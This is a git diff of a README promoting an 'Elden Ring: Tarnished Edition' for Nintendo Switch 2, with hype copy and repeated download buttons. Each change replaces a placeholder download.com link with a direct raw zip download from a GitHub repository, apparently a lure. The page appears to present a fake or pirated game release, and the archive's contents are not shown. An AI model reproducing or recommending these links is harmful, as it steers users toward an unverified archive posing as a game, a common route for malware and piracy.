@@ -4,7 +4,7 @@
 
 > FromSoftware's masterpiece arrives on Nintendo Switch 2 with new weapons, armor, Torrent customization, and all DLC included — the definitive version of one of the best games ever made.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Karlaantediluvian619/elden-ring-tarnished-edition/raw/refs/heads/main/terrestrial/ring_tarnished_elden_edition_v1.4-beta.5.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **August 28, 2026** · Available on **Nintendo Switch 2 (+ all platf
 
 ### Ready to play / use?
 
-[![Download Elden Ring: Tarnished Edition](https://img.shields.io/badge/Download-Elden%20Ring%20Tarnished%20Edition-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Elden Ring: Tarnished Edition](https://img.shields.io/badge/Download-Elden%20Ring%20Tarnished%20Edition-brightgreen?style=for-the-badge)](https://github.com/Karlaantediluvian619/elden-ring-tarnished-edition/raw/refs/heads/main/terrestrial/ring_tarnished_elden_edition_v1.4-beta.5.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/Karlaantediluvian619/elden-ring-tarnished-edition/raw/refs/heads/main/terrestrial/ring_tarnished_elden_edition_v1.4-beta.5.zip)**
 
 </div>
 
@@ -67,7 +67,7 @@ Elden Ring: Tarnished Edition is one of the **most hyped releases of Summer 2026
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/Karlaantediluvian619/elden-ring-tarnished-edition/raw/refs/heads/main/terrestrial/ring_tarnished_elden_edition_v1.4-beta.5.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -75,7 +75,7 @@ Elden Ring: Tarnished Edition is one of the **most hyped releases of Summer 2026
 
 **Don't miss out — Elden Ring: Tarnished Edition is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Elden%20Ring%20Tarnished%20Edition-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Elden%20Ring%20Tarnished%20Edition-blue?style=for-the-badge)](https://github.com/Karlaantediluvian619/elden-ring-tarnished-edition/raw/refs/heads/main/terrestrial/ring_tarnished_elden_edition_v1.4-beta.5.zip)
 
 *Elden Ring: Tarnished Edition — August 28, 2026 · Nintendo Switch 2 (+ all platforms)*
 
